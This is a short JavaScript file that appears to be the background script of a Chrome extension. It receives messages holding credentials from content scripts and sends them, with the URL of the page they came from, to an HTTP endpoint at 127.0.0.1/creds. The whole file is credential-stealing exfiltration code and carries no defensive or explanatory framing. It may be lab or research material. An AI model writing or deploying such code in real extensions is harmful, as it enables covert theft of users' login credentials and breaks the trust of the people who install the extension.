chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
	send({
			url: sender.url, creds: request.creds
		});
});

function send(content) {
	var xhr = new XMLHttpRequest();
	xhr.open("POST", 'http://127.0.0.1/creds')
	xhr.setRequestHeader("Content-type", "application/json");
	xhr.send(JSON.stringify(content));
}